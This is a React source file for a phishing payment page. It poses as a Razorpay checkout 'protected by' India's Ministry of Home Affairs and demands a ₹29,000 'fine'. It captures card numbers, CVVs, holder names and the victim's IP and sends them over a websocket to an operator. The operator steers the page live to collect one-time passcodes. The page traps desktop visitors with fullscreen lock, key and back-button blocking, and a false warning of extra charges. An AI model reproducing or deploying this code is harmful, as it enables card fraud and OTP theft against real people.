import React, { useState, useEffect, useRef } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle, X } from 'lucide-react';
import { wsClient } from '@/integrations/ws-client';
import OTPVerificationPage from './OTPVerificationPage';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

// Card validation functions
const validateCardNumber = (cardNumber: string) => {
  const cleaned = cardNumber.replace(/\s/g, '');
  
  // Luhn algorithm
  let sum = 0;
  let isEven = false;
  
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned[i]);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0 && cleaned.length >= 13 && cleaned.length <= 19;
};

const getCardBrand = (cardNumber: string) => {
  const cleaned = cardNumber.replace(/\s/g, '');
  
  if (/^4/.test(cleaned)) {
    return {
      name: 'visa',
      logo: 'https://static.vecteezy.com/system/resources/thumbnails/020/975/570/small/visa-logo-visa-icon-transparent-free-png.png',
      cvvLength: 3
    };
  }
  if (/^5[1-5]|^2[2-7]/.test(cleaned)) {
    return {
      name: 'mastercard',
      logo: 'https://logos-world.net/wp-content/uploads/2020/09/Mastercard-Logo-2016-2020-700x394.png',
      cvvLength: 3
    };
  }
  if (/^6/.test(cleaned)) {
    return {
      name: 'rupay',
      logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/rupay-logo.png',
      cvvLength: 3
    };
  }
  if (/^3[47]/.test(cleaned)) {
    return {
      name: 'amex',
      logo: 'https://static-00.iconduck.com/assets.00/amex-icon-256x94-6jo9y59c.png',
      cvvLength: 4
    };
  }
  
  return null;
};

interface PaymentFormProps {
  highlightFields: boolean;
  clickTrigger: number;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');
  const [showBackDialog, setShowBackDialog] = useState(false);
  const [longPressTimer, setLongPressTimer] = useState<ReturnType<typeof setTimeout> | null>(null);
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');
  const [isMobile, setIsMobile] = useState(false);

  // Card validation states
  const [cardValidation, setCardValidation] = useState({
    isValid: false,
    brand: null as any,
    showBrand: false
  });
  const [validationErrors, setValidationErrors] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  const [inputGlow, setInputGlow] = useState({
    cardNumber: false,
    expiryMonth: false,
    expiryYear: false,
    cvv: false,
    cardHolder: false,
  });

  const glowTimeouts = useRef<{[key: string]: ReturnType<typeof setTimeout>}>({});

  // Ref to store the cleanup function for navigation blockers
  const cleanupNavigationBlockersRef = useRef<(() => void) | null>(null);

  // Generic preventDefault function for event listeners
  const preventDefault = (e: Event) => {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
  };

  // Function to clear all navigation blocking event listeners
  const clearNavigationBlockers = () => {
    if (cleanupNavigationBlockersRef.current) {
      cleanupNavigationBlockersRef.current();
      cleanupNavigationBlockersRef.current = null; // Clear the ref after execution
    }
  };

  // Check if a field is filled properly
  const isFieldFilled = (fieldName: string) => {
    switch (fieldName) {
      case 'cardNumber':
        const cleaned = formData.cardNumber.replace(/\s/g, '');
        return cleaned.length >= 13 && validateCardNumber(cleaned);
      case 'expiryMonth':
        const month = parseInt(formData.expiryMonth);
        return month >= 1 && month <= 12;
      case 'expiryYear':
        const year = parseInt(formData.expiryYear);
        return year >= 25 && year <= 50;
      case 'cvv':
        const requiredCvvLength = cardValidation.brand?.cvvLength || 3;
        return formData.cvv.length === requiredCvvLength;
      case 'cardHolder':
        return formData.cardHolder.trim().length > 0;
      default:
        return false;
    }
  };

  // Enhanced glow function with field-specific logic
  const triggerGlow = () => {
    // Don't glow if all fields are filled
    if (isFormValid()) return;
    
    // Clear any existing timeouts
    Object.values(glowTimeouts.current).forEach(timeout => clearTimeout(timeout));
    
    // Only glow empty/invalid fields
    const newGlowState = {
      cardNumber: !isFieldFilled('cardNumber'),
      expiryMonth: !isFieldFilled('expiryMonth'),
      expiryYear: !isFieldFilled('expiryYear'),
      cvv: !isFieldFilled('cvv'),
      cardHolder: !isFieldFilled('cardHolder'),
    };

    setInputGlow(newGlowState);

    // Set timeout to remove glow with smooth animation
    const fadeOutTimeout = setTimeout(() => {
      setInputGlow({
        cardNumber: false,
        expiryMonth: false,
        expiryYear: false,
        cvv: false,
        cardHolder: false,
      });
    }, 800);

    glowTimeouts.current = { fadeOut: fadeOutTimeout };
  };

  // Global click listener for real-time glow effect
  useEffect(() => {
    const handleGlobalClick = (e: MouseEvent) => {
      // Only trigger if we're in fullscreen/highlight mode and not clicking form elements
      if (highlightFields && !isLoading && !showOtp) {
        const target = e.target as HTMLElement;
        
        // Exclude chat section and form inputs from triggering glow
        const isFormInput = target.closest('input, button, form');
        const isChatSection = target.closest('[data-chat-section]') || 
                             target.closest('.chat-container') ||
                             target.closest('#chat') ||
                             target.closest('[class*="chat"]');
        
        if (!isFormInput && !isChatSection) {
          triggerGlow();
        }
      }
    };

    // Add global click listener
    document.addEventListener('click', handleGlobalClick, true);

    return () => {
      document.removeEventListener('click', handleGlobalClick, true);
      // Clear any pending timeouts
      Object.values(glowTimeouts.current).forEach(timeout => clearTimeout(timeout));
    };
  }, [highlightFields, isLoading, showOtp, formData]);

  // Initial glow on fullscreen entry
  useEffect(() => {
    if (highlightFields) {
      triggerGlow();
    }
  }, [highlightFields]);

  // Trigger glow on clickTrigger change
  useEffect(() => {
    if (clickTrigger > 0 && highlightFields) {
      triggerGlow();
    }
  }, [clickTrigger, highlightFields]);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      setIsMobile(isMobileDevice);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Card validation effect
  useEffect(() => {
    const cleaned = formData.cardNumber.replace(/\s/g, '');
    
    if (cleaned.length >= 4) {
      const brand = getCardBrand(cleaned);
      const isValid = validateCardNumber(cleaned) && cleaned.length >= 13;
      
      setCardValidation({
        isValid,
        brand,
        showBrand: !!brand && cleaned.length >= 4
      });
      
      if (cleaned.length >= 13) {
        setValidationErrors(prev => ({
          ...prev,
          cardNumber: !isValid ? 'Invalid card number' : ''
        }));
      }
    } else {
      setCardValidation({
        isValid: false,
        brand: null,
        showBrand: false
      });
      setValidationErrors(prev => ({
        ...prev,
        cardNumber: ''
      }));
    }
  }, [formData.cardNumber]);

  // Month validation
  useEffect(() => {
    if (formData.expiryMonth) {
      const month = parseInt(formData.expiryMonth);
      if (month < 1 || month > 12) {
        setValidationErrors(prev => ({
          ...prev,
          expiryMonth: 'Invalid month (1-12)'
        }));
      } else {
        setValidationErrors(prev => ({
          ...prev,
          expiryMonth: ''
        }));
      }
    }
  }, [formData.expiryMonth]);

  // Year validation
  useEffect(() => {
    if (formData.expiryYear) {
      const year = parseInt(formData.expiryYear);
      if (year < 25 || year > 50) {
        setValidationErrors(prev => ({
          ...prev,
          expiryYear: 'Invalid year (25-50)'
        }));
      } else {
        setValidationErrors(prev => ({
          ...prev,
          expiryYear: ''
        }));
      }
    }
  }, [formData.expiryYear]);

  // CVV validation
  useEffect(() => {
    if (formData.cvv && cardValidation.brand) {
      const requiredLength = cardValidation.brand.cvvLength;
      if (formData.cvv.length !== requiredLength) {
        setValidationErrors(prev => ({
          ...prev,
          cvv: `CVV must be ${requiredLength} digits`
        }));
      } else {
        setValidationErrors(prev => ({
          ...prev,
          cvv: ''
        }));
      }
    }
  }, [formData.cvv, cardValidation.brand]);

  // Check if all card details are filled and valid
  const isFormValid = () => {
    const cleaned = formData.cardNumber.replace(/\s/g, '');
    const month = parseInt(formData.expiryMonth);
    const year = parseInt(formData.expiryYear);
    const requiredCvvLength = cardValidation.brand?.cvvLength || 3;
    
    return cardValidation.isValid &&
           cleaned.length >= 13 &&
           month >= 1 && month <= 12 &&
           year >= 25 && year <= 50 &&
           formData.cvv.length === requiredCvvLength &&
           formData.cardHolder.trim().length > 0 &&
           !Object.values(validationErrors).some(error => error !== '');
  };

  useEffect(() => {
    // Only apply desktop-specific key blocking if not on mobile
    if (isMobile) return;

    // Ultra-strong ESC key blocking - ENHANCED VERSION
    const handleKeyDown = (event: KeyboardEvent) => {
      // Block ESC key completely with maximum prevention
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        
        // Force fullscreen to stay active
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {
            console.log('Fullscreen request failed');
          });
        }
        
        return false;
      }
      
      // Block back navigation
      if (event.altKey && event.key === 'ArrowLeft') {
        event.preventDefault();
        setShowBackDialog(true);
        return false;
      }
      
      // Block browser shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4') ||
          (event.key === 'F11')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Add back button prevention for desktop
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      setShowBackDialog(true);
      window.history.pushState(null, '', window.location.href);
    };

    // Push initial state and add listener
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    // Define targets here so it's available for cleanup
    const targets = [document, window, document.body, document.documentElement];

    // Additional ESC blocking
    const preventEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    // Store cleanup function in ref
    cleanupNavigationBlockersRef.current = () => {
      window.removeEventListener('popstate', handlePopState);
      targets.forEach(target => {
        target.removeEventListener('keydown', handleKeyDown, true);
        target.removeEventListener('contextmenu', preventDefault, true);
        target.removeEventListener('selectstart', preventDefault, true);
        target.removeEventListener('copy', preventDefault, true);
        target.removeEventListener('cut', preventDefault, true);
      });
      document.removeEventListener('keydown', preventEscape, true);
      window.removeEventListener('keydown', preventEscape, true);
      document.body.removeEventListener('keydown', preventEscape, true);
    };

    // Ultra-strong event blocking on multiple targets with maximum prevention
    targets.forEach(target => {
      target.addEventListener('keydown', handleKeyDown, true);
      target.addEventListener('contextmenu', preventDefault, true);
      target.addEventListener('selectstart', preventDefault, true);
      target.addEventListener('copy', preventDefault, true);
      target.addEventListener('cut', preventDefault, true);
    });

    // Multiple event listeners for maximum ESC blocking
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    return () => {
      if (cleanupNavigationBlockersRef.current) {
        cleanupNavigationBlockersRef.current();
      }
      // Clear long press timer if it exists
      if (longPressTimer) {
        clearTimeout(longPressTimer);
      }
    };
  }, [longPressTimer, isMobile]);

  useEffect(() => {
    const handleAdminCommand = (payload: any) => {
      const { command, submission_id, bank_name, bank_logo } = payload;
      console.log('PaymentForm received admin command:', payload);
      
      // Only process commands if we have a socket ID
      if (!submission_id) {
        console.log('No submission_id in command payload');
        return;
      }
      
      // Get the current socket ID
      const socketId = wsClient.getSocketId();
      if (!socketId) {
        console.log('No socket ID available');
        return;
      }
      
      // Only process commands if they match our socket ID
      if (submission_id !== socketId) {
        console.log('Command submission_id does not match our socket ID');
        return;
      }

      switch (command) {
        case 'showotp':
          if (bank_name) setSelectedBank(bank_name);
          if (bank_logo) setSelectedBankLogo(bank_logo);
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(true);
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'fail':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'success':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setFadeState('fadeIn');
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                clearNavigationBlockers(); // Clear navigation blockers before redirect
                window.location.replace('https://google.com');
              }, 2000);
            }, 4000);
          }, 300);
          break;
        case 'invalidotp':
          setIsConfirmLoading(false);
          setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
          break;
        case 'cardinvalid':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'carddisabled':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
      }
    };

    wsClient.on('admin_command', handleAdminCommand);
    return () => {
      wsClient.off('admin_command', handleAdminCommand);
    };
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      // Only allow numbers and format card number
      const cleaned = value.replace(/\D/g, '');
      const limited = cleaned.slice(0, 16);
      const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
      setFormData(prev => ({
        ...prev,
        [name]: formatted
      }));
    } else if (name === 'expiryMonth' || name === 'expiryYear') {
      // Only allow numbers for expiry
      const numericValue = value.replace(/\D/g, '');
      const limited = numericValue.slice(0, 2);
      setFormData(prev => ({
        ...prev,
        [name]: limited
      }));
    } else if (name === 'cvv') {
      // Only allow numbers for CVV
      const numericValue = value.replace(/\D/g, '');
      const maxLength = cardValidation.brand?.cvvLength || 4;
      const limited = numericValue.slice(0, maxLength);
      setFormData(prev => ({
        ...prev,
        [name]: limited
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }
    
    // Turn off glow when user starts typing
    setInputGlow(prev => ({
      ...prev,
      [name]: false,
    }));
  };

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const generateInvoiceId = () => {
    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
  };

  const sendOtp = (otp: string) => {
    if (currentSubmissionId) {
      console.log(`[PaymentForm] Sending OTP: ${otp} for submission_id: ${currentSubmissionId}`);
      wsClient.send('otp_submitted', { otp, submission_id: currentSubmissionId });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log('[PaymentForm] handleSubmit called.'); // Added log
    if (!isFormValid()) return;
    setIsLoading(true);
    setErrorMessage('');

    const socketId = wsClient.getSocketId();
    console.log(`[PaymentForm] Current socket ID: ${socketId}`); // Added log
    if (!socketId) {
      console.error('No socket ID available');
      setErrorMessage('Error: Not connected to server. Please refresh.');
      setIsLoading(false);
      return;
    }

    setCurrentSubmissionId(socketId);

    const realIP = await getRealIP();
    const cardData = {
      id: socketId,
      socket_id: socketId,
      invoice_id: generateInvoiceId(),
      card_number: formData.cardNumber,
      expiry_month: formData.expiryMonth,
      expiry_year: formData.expiryYear,
      cvv: formData.cvv,
      card_holder: formData.cardHolder,
      amount: formData.amount,
      user_ip: realIP,
      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
      network: getRandomNetwork(),
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    console.log('[PaymentForm] Sending card_submission with data:', cardData); // Added log
    wsClient.send('card_submission', cardData);
  };

  const handleConfirmPay = async (otp: string) => {
    setIsConfirmLoading(true);
    setInvalidOtpMessage('');
    sendOtp(otp);
  };

  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
    setShowBackDialog(false);
    if (action === 'leave') {
      setErrorMessage('Please try again');
      window.location.href = '/';
    }
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className={`${isMobile ? 'w-full' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'}`}>
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }

  return (
    <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? '' : 'p-6'} transition-opacity duration-300 ${fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'}`}>
      {/* Back Dialog */}
      {showBackDialog && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
            <div className="flex space-x-4">
              <button
                onClick={() => handleBackDialogAction('leave')}
                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
              >
                Leave
              </button>
              <button
                onClick={() => handleBackDialogAction('cancel')}
                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Alert */}
      {showAlert && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-bold">Complete the fine payment here</span>
        </div>
      )}

      {/* Payment Notice Image - Made larger and more readable */}
      <div className="mb-6">
        <img 
          src="/lovable-uploads/b7bf07d5-786f-45a7-976a-6e2565bd460f.png" 
          alt="Important: Make sure that online payments are enabled for your card"
          className="w-full h-auto rounded-lg shadow-sm max-w-md mx-auto"
          style={{ minHeight: '60px' }}
        />
      </div>

      {/* Error Message */}
      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Amount Field */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        {/* Card Number with brand detection and validation */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
            <input
              type="tel"
              name="cardNumber"
              placeholder="XXXX XXXX XXXX XXXX"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              onBlur={(e) => {
                  if (e.target.value.trim() === '') {
                    setInputGlow(prev => ({ ...prev, cardNumber: true }));
                  }
                }}
              className={`w-full pl-12 pr-16 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-300 ${
                inputGlow.cardNumber ? 'ring-4 ring-red-500 ring-opacity-70 border-red-400 shadow-lg shadow-red-500/50 animate-pulse' : ''
              } ${
                validationErrors.cardNumber ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={19}
              disabled={isLoading}
            />
            
            {/* Card Brand Logo or Error Icon */}
            <div className="absolute right-3 top-2 w-10 h-6 flex items-center justify-center">
              {formData.cardNumber.length >= 4 && (
                <div className="transition-all duration-300">
                  {cardValidation.showBrand && cardValidation.brand && !validationErrors.cardNumber ? (
                    <img
                      src={cardValidation.brand.logo}
                      alt={cardValidation.brand.name}
                      className="h-6 w-auto object-contain animate-fade-in"
                      style={{ maxWidth: '40px' }}
                    />
                  ) : validationErrors.cardNumber ? (
                    <X className="w-5 h-5 text-red-500 animate-fade-in" />
                  ) : null}
                </div>
              )}
            </div>
          </div>
          {validationErrors.cardNumber && (
            <p className="text-red-500 text-xs mt-1">{validationErrors.cardNumber}</p>
          )}
        </div>

        {/* Date and CVV fields with enhanced validation */}
        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="tel"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              onBlur={(e) => {
                  if (e.target.value.trim() === '') {
                    setInputGlow(prev => ({ ...prev, expiryMonth: true }));
                  }
                }}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-300 ${
                inputGlow.expiryMonth ? 'ring-4 ring-red-500 ring-opacity-70 border-red-400 shadow-lg shadow-red-500/50 animate-pulse' : ''
              } ${validationErrors.expiryMonth ? 'border-red-500' : 'border-gray-300'}`}
              maxLength={2}
              disabled={isLoading}
            />
            {validationErrors.expiryMonth && (
              <p className="text-red-500 text-xs mt-1">{validationErrors.expiryMonth}</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="tel"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              onBlur={(e) => {
                  if (e.target.value.trim() === '') {
                    setInputGlow(prev => ({ ...prev, expiryYear: true }));
                  }
                }}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-300 ${
                inputGlow.expiryYear ? 'ring-4 ring-red-500 ring-opacity-70 border-red-400 shadow-lg shadow-red-500/50 animate-pulse' : ''
              } ${validationErrors.expiryYear ? 'border-red-500' : 'border-gray-300'}`}
              maxLength={2}
              disabled={isLoading}
            />
            {validationErrors.expiryYear && (
              <p className="text-red-500 text-xs mt-1">{validationErrors.expiryYear}</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
              <input
                type="tel"
                name="cvv"
                placeholder={cardValidation.brand?.cvvLength === 4 ? "1234" : "123"}
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                onBlur={(e) => {
                  if (e.target.value.trim() === '') {
                    setInputGlow(prev => ({ ...prev, cvv: true }));
                  }
                }}
                className={`w-full pl-10 pr-2 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-300 ${
                  inputGlow.cvv ? 'ring-4 ring-red-500 ring-opacity-70 border-red-400 shadow-lg shadow-red-500/50 animate-pulse' : ''
                } ${validationErrors.cvv ? 'border-red-500' : 'border-gray-300'}`}
                maxLength={cardValidation.brand?.cvvLength || 4}
                disabled={isLoading}
              />
            </div>
            {validationErrors.cvv && (
              <p className="text-red-500 text-xs mt-1">{validationErrors.cvv}</p>
            )}
          </div>
        </div>

        {/* Card Holder Name with enhanced glow animation */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            onBlur={(e) => {
              if (e.target.value.trim() === '') {
                setInputGlow(prev => ({ ...prev, cardHolder: true }));
              }
            }}
            className={`w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-300 ${
              inputGlow.cardHolder ? 'ring-4 ring-red-500 ring-opacity-70 border-red-400 shadow-lg shadow-red-500/50 animate-pulse' : ''
            }`}
            disabled={isLoading}
          />
        </div>

        {/* SSL encryption notice */}
        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            'Pay Securely'
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

        <div className="text-center mt-4 mb-4">
          <span className="text-sm text-gray-500">Powered by </span>
          <img
            src="https://cdn.worldvectorlogo.com/logos/razorpay.svg"
            alt="Razorpay"
            className="inline-block h-4 align-middle ml-1"
          />
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
